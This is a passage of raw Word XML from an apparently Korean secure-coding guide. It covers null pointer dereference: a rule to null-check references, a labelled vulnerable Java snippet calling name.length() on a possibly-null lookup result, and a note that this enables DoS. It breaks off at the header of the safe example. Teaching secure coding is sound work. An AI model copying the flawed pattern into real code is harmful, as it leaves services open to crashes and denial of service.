              <w:t xml:space="preserve">    throw new PaymentException("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>결제</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>연결</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>오류입니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>.");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>제</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>절</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="1F3564"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>코드오류</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="005E18AC" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  1. Null Pointer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>역참조</w:t>
      </w:r>
      <w:r w:rsidR="005E18AC">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005E18AC">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">– </w:t>
      </w:r>
      <w:r w:rsidR="005E18AC">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="005E18AC">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>f ( “A”</w:t>
      </w:r>
      <w:r w:rsidR="005E18AC" w:rsidRPr="005E18AC">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005E18AC">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="005E18AC" w:rsidRPr="005E18AC">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>equals</w:t>
      </w:r>
      <w:r w:rsidR="005E18AC">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(B))</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>• Null</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이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될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수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있는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참조변수는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사용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전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반드시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> Null </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>여부를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검사한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] null </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>체크</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>메소드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>호출</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String name = userDao.findNameById(userId);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>int len = name.length();  // userId</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>없으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> name=null → NullPointerException</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>userId</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해당하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없으면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> findNameById()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> null</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반환합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> name.length() </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>호출</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> NullPointerException</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생하며</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>중단됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>존재하지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ID</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>반복</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서비스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>불안정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>및</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> DoS</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이어질</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
